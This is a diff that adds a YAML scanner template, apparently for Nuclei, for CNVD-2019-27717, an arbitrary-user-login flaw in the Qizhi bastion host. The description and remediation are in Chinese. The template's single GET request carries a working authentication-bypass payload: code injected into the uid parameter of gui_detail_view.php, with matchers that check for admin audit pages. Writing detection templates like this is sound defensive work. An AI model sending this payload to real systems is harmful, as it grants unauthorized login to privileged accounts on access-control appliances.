@@ -1,0 +1,37 @@
+id: CNVD-2019-27717
+info:
+  name: Qizhi Fortressaircraft Unauthorized Access
+  author:
+  - l0ne1y
+  tags:
+  - qizhi
+  - fortressaircraft
+  - unauth
+  description: |-
+    齐治堡垒机 gui_detail_view.php 任意用户登录漏洞
+    浙江齐治科技股份有限公司是一家主要经营计算机软硬件、网络产品的技术开发等项目的公司。
+
+    齐治堡垒机存在任意用户登录漏洞。攻击者可利用该漏洞登录任意用户。
+  reference:
+  - http://www.i-dock.net/wiki/webapp/%e9%bd%90%e6%b2%bb%e5%a0%a1%e5%9e%92%e6%9c%ba/%e9%bd%90%e6%b2%bb%e5%a0%a1%e5%9e%92%e6%9c%ba%20gui_detail_view.php%20%e4%bb%bb%e6%84%8f%e7%94%a8%e6%88%b7%e7%99%bb%e5%bd%95%e6%bc%8f%e6%b4%9e.html
+  severity: high
+  remediation: |-
+    官方修复方案：
+    1.目前厂商已发布了漏洞修复程序，请及时关注更新：
+    https://www.shterm.com
+requests:
+- matchers:
+  - type: word
+    condition: and
+    part: body
+    words:
+    - 错误的id
+    - 审计管理员
+    - 事件审计
+  - type: status
+    status:
+    - 200
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=shterm'
+  method: GET
